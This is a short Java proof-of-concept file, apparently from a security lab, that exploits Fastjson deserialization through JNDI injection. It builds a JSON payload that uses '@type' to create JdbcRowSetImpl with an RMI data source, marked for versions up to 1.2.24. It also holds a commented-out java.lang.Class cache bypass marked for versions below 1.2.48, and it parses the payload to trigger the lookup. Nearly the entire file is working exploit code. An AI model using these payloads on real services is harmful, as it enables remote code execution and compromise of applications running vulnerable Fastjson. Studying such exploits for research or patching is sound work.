package test;
import com.alibaba.fastjson.JSON;

public class Fastjson1_JNDI {
    public static void main(String[] args) throws Exception {
        //<=1.2.24
        String payload = "{\r\n"
        		+ "    \"a\": {\r\n"
        		+ "        \"@type\": \"com.sun.rowset.JdbcRowSetImpl\", \r\n"
        		+ "        \"dataSourceName\": \"rmi://127.0.0.1:1099/Object\", \r\n"
        		+ "        \"autoCommit\": true\r\n"
        		+ "    }\r\n"
        		+ "}";
        //<1.2.48
//        payload = "{\r\n"
//        		+ "    \"a\": {\r\n"
//        		+ "        \"@type\": \"java.lang.Class\", \r\n"
//        		+ "        \"val\": \"com.sun.rowset.JdbcRowSetImpl\"\r\n"
//        		+ "    }, \r\n"
//        		+ "    \"b\": {\r\n"
//        		+ "        \"@type\": \"com.sun.rowset.JdbcRowSetImpl\", \r\n"
//        		+ "        \"dataSourceName\": \"rmi://127.0.0.1:1099/Object\", \r\n"
//        		+ "        \"autoCommit\": true\r\n"
//        		+ "    }\r\n"
//        		+ "}";
        System.out.println(payload);
        JSON.parse(payload);	
    }
}
